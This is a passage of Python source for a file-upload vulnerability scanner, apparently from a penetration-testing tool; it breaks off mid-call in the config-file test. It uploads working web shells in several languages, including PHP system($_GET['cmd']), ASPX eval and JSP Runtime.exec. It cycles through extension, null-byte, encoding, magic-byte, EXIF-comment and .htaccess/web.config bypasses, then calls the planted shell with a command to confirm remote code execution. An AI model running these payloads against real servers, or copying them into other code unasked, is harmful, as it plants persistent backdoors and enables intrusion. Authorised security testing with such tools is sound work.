"""
File Upload vulnerability scan methods.
"""
"""
Shared imports for scan mixin modules.
"""
import json
import logging
import requests
import urllib.parse
import re
import concurrent.futures
import html as html_module
import time
from typing import Dict, Any, List, Optional, Tuple
from collections import defaultdict

logger = logging.getLogger(__name__)



class UploadScanMixin:
    """Mixin providing file upload vulnerability scan methods."""

    def scan_upload(self) -> Dict[str, Any]:
        """
        Scan for insecure file upload vulnerabilities.

        Test cases (in order — mirrors the methodology from the reference doc):
          TC-1  Blacklist bypass     — alternate PHP/ASP/JSP/CF extensions
          TC-2  Whitelist bypass     — double-ext, null byte, trailing chars,
                                       URL/double-URL encoding, semicolons,
                                       multibyte unicode, recursive-strip bypass
          TC-3  Content-Type bypass  — send PHP file with image/gif, image/png
          TC-4  Magic bytes bypass   — prepend GIF89a / PNG header to PHP shell
          TC-5  Metadata shell       — exiftool-style Comment injection via EXIF
          TC-6  Config file upload   — .htaccess / web.config to remap execution
          TC-7  Zip slip             — path traversal inside archive filename
          TC-8  SVG payloads         — XSS / XXE / SSRF / open redirect via SVG
          TC-9  Filename injection   — SQLi / CMDi / LFI / XSS in filename field
          TC-10 Tiny shell           — size-restricted upload bypass (tiny payloads)
          TC-11 PUT method upload    — PUT /path/shell.php on common static dirs
          TC-12 Path traversal       — ../shell.php variants in filename field;
                                       re-uses first accepted filename from TCs 1-10
                                       to land shell in an executable parent dir

        Detection signals:
          • 200/201 response with no "invalid", "error", "rejected", "failed" in body
          • Response body contains a URL / path pointing to the uploaded file
          • Response differs significantly from a clean baseline (length delta)
          • 500 error — server-side processing failure (potential parse vulnerability)
        """
        self.scan_progress.emit("📁 Scanning for File Upload vulnerabilities...")

        results: Dict[str, Any] = {
            "scan_type":  "Upload",
            "vulnerable": False,
            "details":    [],
            "summary":    "",
            "stats": {
                "test_cases_run":  0,
                "payloads_sent":   0,
                "hits":            0,
            },
        }

        try:
            full_url = self.request_data.get("url", "")
            if not full_url:
                results["summary"] = "No URL provided."
                return results

            # ── Parse request headers ─────────────────────────────────────
            # Strategy:
            #   1. If request_data already has a "headers" dict key (set by the
            #      parent app's HTTP parser) — use it directly.
            #   2. Otherwise parse from request_text, but treat the body as
            #      a raw byte blob — never try to text-decode it.
            #
            # For multipart requests the body contains binary file data.
            # Splitting on "\n" corrupts binary content and produces empty
            # body_content.  We work around this by:
            #   a) Parsing ONLY the header section (everything before \r\n\r\n
            #      or \n\n in the raw text).
            #   b) Extracting multipart part metadata (field names, CSRF values)
            #      by scanning for Content-Disposition lines in the RAW text
            #      using byte-safe regex — the ASCII metadata lines survive even
            #      when the surrounding binary is corrupted.

            headers: Dict[str, str] = {}
            cookies: Dict[str, str] = {}

            # ── Path 1: parent stored a proper headers dict ───────────────
            if self.request_data.get("headers"):
                headers = dict(self.request_data["headers"])
                raw_cookies = headers.get("cookie", headers.get("Cookie", ""))
                raw_pairs = re.split(r';\s*', raw_cookies)
                expanded = []
                for piece in raw_pairs:
                    sub = re.split(r',\s+(?=\w[^=]*=)', piece)
                    expanded.extend(s.strip() for s in sub if s.strip())
                for pair in expanded:
                    if "=" in pair:
                        cn, cv = pair.split("=", 1)
                        cookies[cn.strip()] = cv.strip()

            # ── Path 2: parse from request_text header section only ───────
            else:
                request_text = self.request_data.get("request_text", "")
                # Find end of header section — works for both \r\n\r\n and \n\n
                sep = "\r\n\r\n" if "\r\n\r\n" in request_text else "\n\n"
                header_section = request_text.split(sep, 1)[0]
                seen_cookie = None
                for line in header_section.split("\n")[1:]:
                    line = line.rstrip("\r")
                    if not line:
                        continue
                    if ":" in line:
                        k, v = line.split(":", 1)
                        k, v = k.strip(), v.strip()
                        if k.lower() == "cookie":
                            if seen_cookie is not None:
                                continue
                            seen_cookie = k
                            raw_pairs = re.split(r';\s*', v)
                            expanded = []
                            for piece in raw_pairs:
                                sub = re.split(r',\s+(?=\w[^=]*=)', piece)
                                expanded.extend(s.strip() for s in sub if s.strip())
                            for pair in expanded:
                                if "=" in pair:
                                    cn, cv = pair.split("=", 1)
                                    cookies[cn.strip()] = cv.strip()
                        headers[k] = v

            # ── Extract Content-Type / boundary from headers ──────────────
            ct_header = next(
                (v for k, v in headers.items() if k.lower() == "content-type"), ""
            )
            boundary_match = re.search(r'boundary=([^\s;,"]+)', ct_header)
            boundary = boundary_match.group(1).lstrip("-") if boundary_match else None

            # ── Parse multipart metadata from raw request_text ───────────
            # We DON'T need the binary file content — we generate our own.
            # We DO need: file field name, original filename, non-file fields
            # (user, csrf …).  These appear in ASCII Content-Disposition lines
            # that survive even binary corruption.
            request_text = self.request_data.get("request_text", "")

            file_field        = "file"
            extra_fields: List[Tuple[str, str]] = []
            original_filename = "test.jpg"
            original_ct       = "image/jpeg"

            # Scan for ALL Content-Disposition lines in the raw text
            # Pattern A: file field  — has both name= and filename=
            # Pattern B: plain field — has only name=, no filename=
            for m in re.finditer(
                r'Content-Disposition:\s*form-data;\s*name="([^"]+)";\s*filename="([^"]+)"',
                request_text, re.IGNORECASE
            ):
                file_field        = m.group(1)
                original_filename = m.group(2)
                # Look for Content-Type line immediately after this boundary
                ct_m = re.search(
                    r'Content-Disposition:[^\n]*filename="[^"]+"[^\n]*[\r\n]+'
                    r'Content-Type:\s*([^\r\n]+)',
                    request_text, re.IGNORECASE
                )
                if ct_m:
                    original_ct = ct_m.group(1).strip()
                break  # only first file field matters

            # Plain fields (user, csrf, etc.) — name= without filename=
            # Match: Content-Disposition line followed by blank line then value
            for m in re.finditer(
                r'Content-Disposition:\s*form-data;\s*name="([^"]+)"[ \t]*[\r\n]+'
                r'(?!Content-Type)[ \t]*[\r\n]+'   # blank line (no Content-Type)
                r'([^\r\n\-][^\r\n]*)',             # value line (not a boundary)
                request_text, re.IGNORECASE
            ):
                field_name  = m.group(1)
                field_value = m.group(2).strip()
                # Skip the file field itself
                if field_name != file_field and field_value:
                    extra_fields.append((field_name, field_value))

            # clean_headers — strip host/cookie/content-type/content-length:
            #   • host           — always stripped
            #   • cookie         — rebuilt cleanly below
            #   • content-type   — requests generates its own multipart CT with boundary
            #   • content-length — requests sets the correct length
            _STRIP_UPLOAD = {"host", "cookie", "content-type", "content-length",
                             "transfer-encoding"}
            clean_headers = {k: v for k, v in headers.items()
                             if k.lower() not in _STRIP_UPLOAD}
            # Re-attach Cookie header from parsed cookies dict
            if cookies:
                clean_headers["Cookie"] = "; ".join(
                    f"{k}={v}" for k, v in cookies.items()
                )

            self.scan_progress.emit(
                f"[*] Upload field : '{file_field}' | "
                f"Filename : '{original_filename}' | "
                f"CT : '{original_ct}'"
            )
            if extra_fields:
                self.scan_progress.emit(
                    "[*] Preserved fields: "
                    + ", ".join(f"{k}={v[:30]!r}" for k, v in extra_fields)
                )
                # Detect CSRF/token fields — emit info, Option C config comes from
                # the pre-scan dialog stored on self.csrf_refresh_config (may be None).
                csrf_fields = [k for k, v in extra_fields
                               if re.search(r'csrf|xsrf|token|_token', k, re.IGNORECASE)]
                if csrf_fields:
                    self.scan_progress.emit(
                        f"  🔄 CSRF/token fields detected: {csrf_fields} — "
                        f"auto-refresh enabled (Option B → Option C fallback)."
                    )
            else:
                self.scan_progress.emit(
                    "[*] No non-file fields detected "
                    "(CSRF/user fields will be omitted from probes)"
                )

            # ── CSRF refresh state ────────────────────────────────────────
            # csrf_field_names  : set of form-field names that look like tokens.
            # _extra_fields_ref : mutable single-element list so the _probe
            #                     closure can see updated tokens without nonlocal.
            # Option C is triggered mid-scan via self.csrf_option_c_needed signal
            # (emitted to the UI thread) + self._csrf_option_c_ready Event (blocks
            # this worker thread until the user responds).  After the dialog the
            # URL is in self.csrf_refresh_url.  _csrf_option_c_asked ensures we
            # only prompt once — subsequent probes reuse the cached URL silently.
            csrf_field_names = {
                k for k, v in extra_fields
                if re.search(r'csrf|xsrf|token|_token', k, re.IGNORECASE)
            }
            _extra_fields_ref = [list(extra_fields)]
            _csrf_option_c_asked = False   # True after the first Option C prompt

            def _fetch_fresh_csrf() -> bool:
                """
                Hybrid CSRF token refresh: Option B first, Option C fallback.

                Option B  — GET the upload URL and auto-scrape from:
                    1. <input type="hidden" name="<csrf_name>" value="...">
                    2. <meta name="csrf-token|x-csrf-token" content="...">
                    3. Set-Cookie header with a csrf/xsrf cookie

                Option C  — fires once if Option B finds nothing:
                    Emits csrf_option_c_needed signal → UI shows CsrfOptionCDialog
                    → blocks here until user responds → then uses the supplied URL.
                    On all subsequent calls, the cached URL is used directly.

                Returns True if at least one token value was updated.
                """
                nonlocal _csrf_option_c_asked

                if not csrf_field_names:
                    return False

                fetch_headers = {k: v for k, v in clean_headers.items()
                                 if k.lower() not in ('content-type', 'content-length')}

                # ── Shared scraper ────────────────────────────────────────
                def _scrape_token_from_response(resp, source_hint: str = "auto",
                                                pattern_hint: str = "") -> Optional[str]:
                    """
                    Extract a CSRF token from an HTTP response.
                    source_hint: "auto" | "html_input" | "html_meta" | "json" | "cookie"
                    pattern_hint: field name / JSON key / regex (used in non-auto modes).
                    Returns the raw token string or None.
                    """
                    if not resp:
                        return None
                    html_body = getattr(resp, "text", "") or ""

                    # ── html_input ────────────────────────────────────────
                    if source_hint in ("auto", "html_input"):
                        names_to_try = list(csrf_field_names)
                        if pattern_hint:
                            names_to_try = [pattern_hint] + names_to_try
                        for fname in names_to_try:
                            for pat in (
                                rf'<input[^>]+name=["\']?{re.escape(fname)}["\']?[^>]+value=["\']([^"\']+)["\']',
                                rf'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']?{re.escape(fname)}["\']?',
                            ):
                                m = re.search(pat, html_body, re.IGNORECASE)
                                if m:
                                    return m.group(1).strip()

                    # ── html_meta ─────────────────────────────────────────
                    if source_hint in ("auto", "html_meta"):
                        meta_names = (
                            [pattern_hint] if pattern_hint
                            else ["csrf-token", "x-csrf-token", "xsrf-token",
                                  "_token", "csrf"]
                        )
                        for mname in meta_names:
                            for pat in (
                                rf'<meta[^>]+name=["\']?{re.escape(mname)}["\']?[^>]+content=["\']([^"\']+)["\']',
                                rf'<meta[^>]+content=["\']([^"\']+)["\'][^>]+name=["\']?{re.escape(mname)}["\']?',
                            ):
                                m = re.search(pat, html_body, re.IGNORECASE)
                                if m:
                                    return m.group(1).strip()

                    # ── cookie ────────────────────────────────────────────
                    if source_hint in ("auto", "cookie"):
                        cookie_pat = pattern_hint or r'csrf|xsrf'
                        for cname, cval in resp.cookies.items():
                            if re.search(cookie_pat, cname, re.IGNORECASE):
                                cookies[cname] = cval
                                clean_headers["Cookie"] = "; ".join(
                                    f"{k}={v}" for k, v in cookies.items()
                                )
                                return cval

                    # ── regex fallback ────────────────────────────────────
                    if pattern_hint and source_hint not in (
                            "html_input", "html_meta", "cookie"):
                        m = re.search(pattern_hint, html_body)
                        if m:
                            return (m.group(1) if m.lastindex else m.group(0)).strip()

                    return None

                def _apply_token(new_token: str, label: str) -> bool:
                    """Write new_token into _extra_fields_ref[0] for all CSRF fields."""
                    new_fields = list(_extra_fields_ref[0])
                    changed = False
                    for idx, (fname, fval) in enumerate(new_fields):
                        if fname in csrf_field_names and new_token != fval:
                            new_fields[idx] = (fname, new_token)
                            changed = True
                            self.scan_progress.emit(
                                f"  🔄 [{label}] CSRF '{fname}' → "
                                f"{new_token[:24]!r}{'…' if len(new_token) > 24 else ''}"
                            )
                    if changed:
                        _extra_fields_ref[0] = new_fields
                    return changed

                # ── Option B: auto-scrape from the upload page ────────────
                try:
                    b_resp = self.send_request_with_traffic(
                        full_url, fetch_headers, method="GET",
                        payload="csrf_refresh_B", payload_type="Upload-CSRF-Refresh-B"
                    )
                    new_token = _scrape_token_from_response(b_resp, source_hint="auto")
                    if new_token:
                        return _apply_token(new_token, "B")
                except Exception as e:
                    logger.debug(f"CSRF Option B fetch failed: {e}")

                # ── Option C: mid-scan user prompt (once) ─────────────────
                # Skip entirely if user already chose Skip in the dialog.
                if getattr(self, "_csrf_option_c_skip", False):
                    return False

                c_url = getattr(self, "csrf_refresh_url", None)

                if not c_url and not _csrf_option_c_asked:
                    # First time B failed — ask the user via the UI signal.
                    _csrf_option_c_asked = True
                    self._csrf_option_c_ready.clear()
                    self.scan_progress.emit(
                        "  ⚠️  [B] Auto-detect found no token — "
                        "pausing scan to ask for refresh URL..."
                    )
                    self.csrf_option_c_needed.emit(
                        list(csrf_field_names), full_url
                    )
                    # Block this thread until the UI slot sets the event.
                    self._csrf_option_c_ready.wait()
                    c_url = getattr(self, "csrf_refresh_url", None)

                if not c_url:
                    # User skipped or no URL was entered
                    return False

                try:
                    self.scan_progress.emit(
                        f"  🔄 [C] Fetching token from: {c_url}"
                    )
                    c_resp = self.send_request_with_traffic(
                        c_url, fetch_headers, method="GET",
                        payload="csrf_refresh_C", payload_type="Upload-CSRF-Refresh-C"
                    )
                    new_token = _scrape_token_from_response(c_resp, source_hint="auto")
                    if new_token:
                        return _apply_token(new_token, "C")
                    else:
                        self.scan_progress.emit(
                            "  ⚠️  [C] No token found at the supplied URL — "
                            "probes will continue with the last known token."
                        )
                except Exception as e:
                    logger.debug(f"CSRF Option C fetch failed: {e}")
                    self.scan_progress.emit(f"  ⚠️  [C] Refresh request failed: {e}")

                return False

            # ── Baseline: upload a clean image — record accept/reject pattern ─
            self.scan_progress.emit("\n[BASELINE] Uploading clean image...")
            baseline_files = self._upload_build_files(
                file_field, "test.jpg", b"\xff\xd8\xff\xe0" + b"\x00" * 16,
                "image/jpeg", extra_fields
            )
            b_resp = self.send_request_with_traffic(
                full_url, clean_headers, method="POST",
                payload="clean_baseline",
                payload_type="Upload-Baseline",
                files=baseline_files,
            )
            baseline_status = getattr(b_resp, "status_code", 0) or 0
            baseline_length = len(getattr(b_resp, "content", b""))
            baseline_text   = getattr(b_resp, "text", "") or ""
            baseline_accept = self._upload_is_accepted(b_resp)

            self.scan_progress.emit(
                f"  📈 Baseline: HTTP {baseline_status} | "
                f"{baseline_length}b | "
                f"{'ACCEPTED ✓' if baseline_accept else 'REJECTED ✗'}"
            )

            # Refresh CSRF after baseline — baseline consumed the original token.
            if csrf_field_names:
                self.scan_progress.emit("[*] Refreshing CSRF token after baseline...")
                _fetch_fresh_csrf()

            # ── Helper: send one upload probe and evaluate ────────────────
            def _probe(tc: str, filename: str, content: bytes,
                       content_type: str, description: str,
                       extra: List[Tuple[str, str]] = None,
                       exec_param: str = "cmd",
                       verify_path: str = None,
                       verify_content: bytes = None) -> Optional[Dict]:
                results["stats"]["payloads_sent"] += 1
                # Use the live (possibly refreshed) extra_fields unless caller
                # supplies an explicit override via `extra`.
                _effective_extra = extra if extra is not None else _extra_fields_ref[0]
                fdict = self._upload_build_files(
                    file_field, filename, content, content_type,
                    _effective_extra
                )
                resp = self.send_request_with_traffic(
                    full_url, clean_headers, method="POST",
                    payload=filename,
                    payload_type=f"Upload-{tc}",
                    files=fdict,
                )
                sc = getattr(resp, "status_code", 0) or 0

                # ── CSRF auto-refresh on 403 → retry once ─────────────────
                if sc == 403 and csrf_field_names and extra is None:
                    self.scan_progress.emit(
                        f"    [{tc}] 403 received — attempting CSRF refresh (B→C)..."
                    )
                    if _fetch_fresh_csrf():
                        results["stats"]["payloads_sent"] += 1
                        fdict = self._upload_build_files(
                            file_field, filename, content, content_type,
                            _extra_fields_ref[0]
                        )
                        resp = self.send_request_with_traffic(
                            full_url, clean_headers, method="POST",
                            payload=filename,
                            payload_type=f"Upload-{tc}-CSRFRetry",
                            files=fdict,
                        )
                        sc = getattr(resp, "status_code", 0) or 0
                        if sc != 403:
                            self.scan_progress.emit(
                                f"    [{tc}] ✅ CSRF refresh succeeded → HTTP {sc}"
                            )
                        else:
                            self.scan_progress.emit(
                                f"    [{tc}] ❌ Still 403 after refresh — "
                                f"token may require a different source/pattern."
                            )
                    else:
                        self.scan_progress.emit(
                            f"    [{tc}] ⚠️  Could not refresh CSRF token — "
                            f"probes will continue with the last known token."
                        )
                rlen = len(getattr(resp, "content", b""))
                rtxt = getattr(resp, "text", "") or ""
                accepted = self._upload_is_accepted(resp)

                rce_verified = False
                verify_url_log = ""
                url_found = ""

                if accepted:
                    url_found = self._upload_extract_url(rtxt, full_url)
                    
                    # ── Verification: Try to execute the file if base URL is known ──
                    target_urls = []
                    if verify_path:
                        target_urls.append(verify_path)
                    elif self.upload_base_url:
                        base = self.upload_base_url if self.upload_base_url.endswith('/') else self.upload_base_url + '/'
                        target_urls.append(f"{base}{filename}")
                    
                    # Apply smart mutations (Null byte stripping, Double extension stripping)
                    # Iterate over a copy to append new variants
                    for url in list(target_urls):
                        # 1. Null Byte Handling (shell.php%00.jpg -> shell.php)
                        if "%00" in url:
                            target_urls.append(url.split('%00')[0])
                        if "\x00" in url:
                            target_urls.append(url.split('\x00')[0])
                            
                        # 2. Double Extension Handling (shell.php.jpg -> shell.php)
                        exec_exts = ['php', 'phtml', 'phar', 'php3', 'php4', 'php5', 'asp', 'aspx', 'jsp', 'jspx', 'pl', 'py', 'cgi', 'sh', 'shtml']
                        for ext in exec_exts:
                            # Look for .ext. (case insensitive) in the URL
                            if re.search(f"\\.{ext}\\.", url, re.IGNORECASE):
                                idx = url.lower().rfind(f".{ext}.")
                                if idx != -1:
                                    truncated = url[:idx + len(ext) + 1]
                                    target_urls.append(truncated)

                    # Remove duplicates while preserving order
                    target_urls = list(dict.fromkeys(target_urls))

                    for target_url in target_urls:
                        if rce_verified: break

                        if exec_param:
                            try:
                                verify_token = f"HUNT_RCE_{int(time.time())}"
                                command = f"echo '{verify_token}';"
                                
                                # Construct URL with query parameter
                                sep = "&" if "?" in target_url else "?"
                                verify_url = f"{target_url}{sep}{exec_param}={urllib.parse.quote(command)}"
                                
                                self.scan_progress.emit(f"      🚀 Sending verification request: {verify_url}")
                                
                                # Prepare headers for verification (cookies, user-agent, etc.)
                                verify_headers = {k: v for k, v in clean_headers.items() 
                                                if k.lower() not in ('content-type', 'content-length')}
                                
                                verify_resp = self.send_request_with_traffic(
                                    verify_url, verify_headers, method="GET",
                                    payload=command,
                                    payload_type=f"Upload-Verify-{tc}"
                                )
                                
                                if verify_resp and hasattr(verify_resp, 'text') and verify_token in verify_resp.text:
                                    rce_verified = True
                                    verify_url_log = verify_url
                                    description = f"🔥 RCE VERIFIED: {description}"
                            except Exception as e:
                                logger.debug(f"Verification failed: {e}")
                        
                        elif verify_content:
                            try:
                                self.scan_progress.emit(f"      🚀 Sending content verification request: {target_url}")
                                
                                verify_headers = {k: v for k, v in clean_headers.items() 
                                                if k.lower() not in ('content-type', 'content-length')}
                                
                                verify_resp = self.send_request_with_traffic(
                                    target_url, verify_headers, method="GET",
                                    payload_type=f"Upload-Verify-{tc}"
                                )
                                
                                if verify_resp and hasattr(verify_resp, 'content') and verify_content in verify_resp.content:
                                    rce_verified = True
                                    verify_url_log = target_url
                                    description = f"✅ CONTENT VERIFIED: {description}"
                            except Exception as e:
                                logger.debug(f"Content verification failed: {e}")

                # Log output in a single line (unless RCE verified)
                status_str = "✅ ACCEPTED" if accepted else "✗"
                rce_str = ""
                if accepted and self.upload_base_url:
                    if rce_verified:
                        if exec_param:
                            rce_str = " | 🔥 RCE VERIFIED"
                        else:
                            rce_str = " | ✅ CONTENT VERIFIED"
                    else:
                        if exec_param:
                            rce_str = " | ❓ RCE Check Failed"
                        elif verify_content:
                            rce_str = " | ❓ Content Check Failed"
                
                self.scan_progress.emit(
                    f"    [{tc}] {filename[:40]:<42} "
                    f"HTTP {sc} | {rlen}b | {status_str}{rce_str}"
                )

                if rce_verified:
                    msg = f"🔥 RCE VERIFIED: {verify_url_log}" if exec_param else f"✅ CONTENT VERIFIED: {verify_url_log}"
                    width = len(msg) + 4
                    self.scan_progress.emit(f"\n    ╔{'═'*width}╗")
                    self.scan_progress.emit(f"    ║  {msg}  ║")
                    self.scan_progress.emit(f"    ╚{'═'*width}╝\n")

                if accepted:
                    # Confidence: HIGH if RCE confirmed, MEDIUM for clean 2xx, LOW for 500
                    if rce_verified:
                        confidence = "HIGH"
                    elif sc == 500:
                        confidence = "LOW"
                    else:
                        confidence = "MEDIUM"
                    return {
                        "test_case":   tc,
                        "description": description,
                        "filename":    filename,
                        "content_type": content_type,
                        "status_code": sc,
                        "response_length": rlen,
                        "file_url":    url_found,
                        "response_snippet": rtxt[:300],
                        "rce_verified": rce_verified,
                        "verify_url": verify_url_log,
                        "confidence":  confidence,
                    }
                return None

            # ─────────────────────────────────────────────────────────────
            # TC-1: BLACKLIST BYPASS — alternate executable extensions
            # ─────────────────────────────────────────────────────────────
            self.scan_progress.emit("\n[TC-1] Blacklist bypass — alternate extensions...")
            results["stats"]["test_cases_run"] += 1
            
            # Language configurations
            LANG_CONFIGS = {
                "PHP": {
                    "ext": "php",
                    "payload": b"<?php system($_GET['cmd']); ?>",
                    "ct": "application/x-php",
                    "exts": ["php", "phtml", "phtm", "php3", "php4", "php5", "php7", "phps", "pht", "shtml", "phar", "pgif", "inc", "PHP", "PhP", "pHp", "pHP5", "PhAr"]
                },
                "ASP.NET": {
                    "ext": "aspx",
                    "payload": b'<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>',
                    "ct": "application/x-aspx",
                    "exts": ["asp", "aspx", "cer", "asa", "ashx", "asmx", "axd"]
                },
                "JSP": {
                    "ext": "jsp",
                    "payload": b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
                    "ct": "application/x-jsp",
                    "exts": ["jsp", "jspx", "jsw", "jsv", "jspf"]
                },
                "Python": {
                    "ext": "py",
                    "payload": b"import os, cgi; print('Content-Type: text/plain\\n'); form = cgi.FieldStorage(); cmd = form.getvalue('cmd'); os.system(cmd) if cmd else None",
                    "ct": "text/x-python",
                    "exts": ["py", "pyc", "cgi"]
                },
                "Node.js": {
                    "ext": "js",
                    "payload": b"require('child_process').exec(new URL(import.meta.url).searchParams.get('cmd'), (e,o,r)=>console.log(o))",
                    "ct": "application/javascript",
                    "exts": ["js", "json", "node"]
                },
                "Ruby": {
                    "ext": "rb",
                    "payload": b"require 'cgi'; cgi = CGI.new; puts cgi.header; system(cgi['cmd']) if cgi['cmd']",
                    "ct": "application/x-ruby",
                    "exts": ["rb", "rbw", "cgi"]
                },
                "Shell": {
                    "ext": "sh",
                    "payload": b"#!/bin/bash\necho 'Content-type: text/plain'\necho ''\neval \"$QUERY_STRING\"",
                    "ct": "application/x-sh",
                    "exts": ["sh", "bash", "cgi", "pl"]
                }
            }
            
            active_configs = [LANG_CONFIGS[lang] for lang in self.target_langs if lang in LANG_CONFIGS]
            if not active_configs:
                active_configs = [LANG_CONFIGS["PHP"]]

            for config in active_configs:
                for ext in config["exts"]:
                    if not self.running: break
                    hit = _probe(
                        "TC1-Blacklist", f"shell.{ext}", config["payload"],
                        config["ct"],
                        f"Blacklist bypass: .{ext} extension accepted"
                    )
                    if hit:
                        results["vulnerable"] = True
                        results["stats"]["hits"] += 1
                        results["details"].append(hit)

            # ─────────────────────────────────────────────────────────────
            # TC-2: WHITELIST BYPASS — double-ext, null byte, special chars,
            #        trailing chars, URL-encoding, semicolons, multibyte
            #        unicode, recursive-strip bypass
            # ─────────────────────────────────────────────────────────────
            self.scan_progress.emit("\n[TC-2] Whitelist bypass — double extension / special chars...")
            results["stats"]["test_cases_run"] += 1
            
            for config in active_configs:
                ext = config["ext"]
                payload = config["payload"]
                
                # Generate dynamic whitelist names based on extension
                WHITELIST_NAMES = [
                    f"shell.jpg.{ext}",
                    f"shell.{ext}.jpg",
                    f"shell.{ext}.blah123jpg",
                    f"shell.{ext}%00.jpg",
                    f"shell.{ext}\x00.jpg",
                    f"shell.{ext}%00",
                    f"shell.{ext}%20",
                    f"shell.{ext}%0d%0a.jpg",
                    f"shell.{ext} ",
                    f"shell.{ext}.",
                    f"shell.{ext}.....",
                    f"shell.{ext}/",
                    f"shell.{ext}.\\",
                    f"shell.{ext}#.png",
                    f"shell.",
                    f".{ext}",
                    f"shell.{ext};.jpg",
                    f"shell.{ext}%3b.jpg",
                    f"shell%2E{ext}",
                    f"shell%2e{ext}",
                    f"shell%252E{ext}",
                    f"shell.{ext}%2f.jpg",
                    f"shell.{ext}%5c.jpg",
                    f"shell.{ext}%2f%2e%2e%2fjpg",
                ]
                
                # Add language specific recursive strip bypasses
                if ext == "php":
                    WHITELIST_NAMES.extend(["shell.p.phphp", "shell.ph.phpP", "shell.pHp.phpjpg"])
                elif ext == "aspx":
                    WHITELIST_NAMES.extend(["shell.as.aspspx", "shell.asp.aspxjpg"])

                for name in WHITELIST_NAMES:
                    if not self.running: break
                    hit = _probe(
                        "TC2-Whitelist", name, payload,
                        "image/jpeg",
                        f"Whitelist bypass: '{name}' accepted as image"
                    )
                    if hit:
                        results["vulnerable"] = True
                        results["stats"]["hits"] += 1
                        results["details"].append(hit)

            # ─────────────────────────────────────────────────────────────
            # TC-3: CONTENT-TYPE BYPASS
            # ─────────────────────────────────────────────────────────────
            self.scan_progress.emit("\n[TC-3] Content-Type bypass...")
            results["stats"]["test_cases_run"] += 1
            IMAGE_CTS = ["image/jpeg", "image/png", "image/gif",
                         "image/webp", "text/plain", "application/octet-stream"]
            
            for config in active_configs:
                ext = config["ext"]
                payload = config["payload"]
                
                for ct in IMAGE_CTS:
                    if not self.running: break
                    ct_slug = ct.replace("/", "_").replace("-", "_")
                    filename = f"shell_ct_{ct_slug}.{ext}"
                    hit = _probe(
                        "TC3-ContentType", filename, payload, ct,
                        f"Content-Type bypass: {filename} accepted with CT={ct}"
                    )
                    if hit:
                        results["vulnerable"] = True
                        results["stats"]["hits"] += 1
                        results["details"].append(hit)

            # ─────────────────────────────────────────────────────────────
            # TC-4: MAGIC BYTES BYPASS — prepend file signature
            # ─────────────────────────────────────────────────────────────
            self.scan_progress.emit("\n[TC-4] Magic bytes bypass...")
            results["stats"]["test_cases_run"] += 1
            
            for config in active_configs:
                ext = config["ext"]
                payload = config["payload"]
                
                MAGIC_COMBOS = [
                    (b"GIF89a;\n",       "image/gif",  f"shell_magic_gif89a.{ext}", "GIF89a magic"),
                    (b"GIF87a;\n",       "image/gif",  f"shell_magic_gif87a.gif.{ext}", "GIF87a double-ext"),
                    (b"\xff\xd8\xff\xe0","image/jpeg", f"shell_magic_jpeg.{ext}", "JPEG magic"),
                    (b"\x89PNG\r\n\x1a\n","image/png", f"shell_magic_png.{ext}", "PNG magic"),
                    (b"BM",             "image/bmp",  f"shell_magic_bmp.{ext}", "BMP magic"),
                    (b"\x49\x49\x2a\x00","image/tiff", f"shell_magic_tiff.{ext}", "TIFF magic"),
                ]
                for magic, ct, fname, desc in MAGIC_COMBOS:
                    if not self.running: break
                    content = magic + b"\n" + payload
                    hit = _probe("TC4-MagicBytes", fname, content, ct, desc)
                    if hit:
                        results["vulnerable"] = True
                        results["stats"]["hits"] += 1
                        results["details"].append(hit)

            # ─────────────────────────────────────────────────────────────
            # TC-5: EXIF METADATA SHELL
            # ─────────────────────────────────────────────────────────────
            if "PHP" in self.target_langs:
                self.scan_progress.emit("\n[TC-5] EXIF metadata shell (PHP)...")
                results["stats"]["test_cases_run"] += 1
                # Build a minimal JPEG with PHP in EXIF Comment field
                php_comment = b"<?php echo 'CMD:'; if($_POST){system($_POST['cmd']);} __halt_compiler(); ?>"
                com_len = len(php_comment) + 2
                fake_jpeg = (
                    b"\xff\xd8"                              # SOI
                    b"\xff\xfe"                              # COM marker
                    + com_len.to_bytes(2, "big")             # segment length
                    + php_comment
                    + b"\xff\xd9"                            # EOI
                )
                for fname in ("image.jpg", "image.php"):
                    if not self.running: break
                    hit = _probe(
                        "TC5-ExifShell", fname, fake_jpeg, "image/jpeg",
                        f"EXIF/Comment embedded PHP shell in {fname}"
                    )
                    if hit:
                        results["vulnerable"] = True
                        results["stats"]["hits"] += 1
                        results["details"].append(hit)

            # ─────────────────────────────────────────────────────────────
            # TC-6: CONFIG FILE UPLOAD (.htaccess / web.config)
            # ─────────────────────────────────────────────────────────────
            self.scan_progress.emit("\n[TC-6] Config file upload (.htaccess / web.config)...")
            results["stats"]["test_cases_run"] += 1
            
            configs_to_test = []
            
            if "PHP" in self.target_langs:
                HTACCESS = b"AddType application/x-httpd-php .png\n"
                PHP_PAYLOAD = b"<?php system($_GET['cmd']); ?>"
                configs_to_test.append((".htaccess",  HTACCESS,  "text/plain", PHP_PAYLOAD, ".png", "PHP shell via .png mapping"))
                configs_to_test.append((".htaccess",  HTACCESS,  "application/octet-stream", PHP_PAYLOAD, ".png", "PHP shell via .png mapping"))
                
            if "ASP.NET" in self.target_langs:
                WEBCONFIG = (
                    b'<?xml version="1.0" encoding="UTF-8"?>\n'
                    b'<configuration>\n'
                    b'  <system.webServer>\n'
                    b'    <handlers>\n'
                    b'      <add name="aspx" path="*.png" verb="*" '
                    b'type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified"/>\n'
                    b'    </handlers>\n'
                    b'  </system.webServer>\n'
                    b'</configuration>\n'
                )
                ASPX_PAYLOAD = b'<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>'
                configs_to_test.append(("web.config", WEBCONFIG, "text/xml", ASPX_PAYLOAD, ".png", "ASPX shell via .png mapping"))

            for cfg_name, cfg_content, cfg_ct, shell_payload, shell_ext, shell_desc in configs_to_test:
                if not self.running: break
                
                # 1. Upload config
                hit = _probe(
                    "TC6-ConfigUpload", cfg_name, cfg_content, cfg_ct,
                    f"Config file accepted: {cfg_name}",
                    exec_param=None
                )
                if hit:
                    results["vulnerable"] = True
                    results["stats"]["hits"] += 1
                    results["details"].append(hit)
                    
                    # 2. If accepted, upload shell
                    self.scan_progress.emit(f"    ↳ Config accepted! Attempting to upload shell{shell_ext} to exploit mapping...")
                    
                    shell_fname = f"shell{shell_ext}"
                    shell_hit = _probe(
                        "TC6-ConfigUpload-Exploit", shell_fname, shell_payload, "image/png",
